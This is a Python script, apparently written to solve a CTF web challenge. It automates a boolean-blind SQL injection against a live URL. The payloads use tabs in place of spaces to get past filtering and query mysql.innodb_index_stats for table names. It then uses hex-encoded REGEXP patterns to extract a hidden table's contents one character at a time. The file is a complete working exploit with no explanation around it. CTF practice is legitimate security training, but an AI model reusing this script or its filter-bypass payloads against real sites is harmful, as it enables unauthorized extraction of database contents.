import re
import time
from re import escape

from requests_html import AsyncHTMLSession, HTMLSession
import string

url = 'http://www.cduestc.cn:50008/'
success = '恭喜你被CTF大学成功录取！'
proxies = {'http': 'http://localhost:8080'}
proxies = {}

# -database ctf
database = "ctf"
# payload_data = '1	and	DATABASE()	regexp	{}'
# -user kctf@localhost
# payload_data = '1	and	user()	regexp	{}'
# -table 6aWu6Iy25YWI5ZWm
payload_data = '1	and	(select group_concat(b) from (select DISTINCT table_name as b from mysql.innodb_index_stats WHERE DATAbase_name REGEXP DATABASE())b) REGEXP {}'

# -res
table_name = '6aWu6Iy25YWI5ZWm'
payload_data = f'1	and	(select	group_concat(`2`)	from	(select	1,2	union	select	*	from	{table_name})a)	regexp	{{}}'
payload_data = payload_data.replace(' ', '\t')
data = {
    'keywords': payload_data,
}

start_time = time.time()
session = HTMLSession()

flag = r''''''


def descape(flag):
    return re.sub(r'\\(.)', r'\1', flag)


while True:

    # printable = string.printable
    printable = list(dict.fromkeys(string.printable.lower()))
    for c in printable:
        # for c in string.printable:

        pr = '0x' + f'^{flag}{escape(c)}.*'.encode().hex()
        data['keywords'] = payload_data.format(pr)
        print(data['keywords'])
        res = session.post(url, data=data, proxies=proxies)
        if success in res.text:
            flag += escape(c)
            print('data is ', descape(flag))
            break
    if c == printable[-1]:
        pr = '0x' + f'^{flag}$'.encode().hex()
        data['keywords'] = payload_data.format(pr)
        print(data['keywords'])
        res = session.post(url, data=data, proxies=proxies)
        if success in res.text:
            print('get end')
            print('data is ', descape(flag))
            exit(0)

        raise Exception
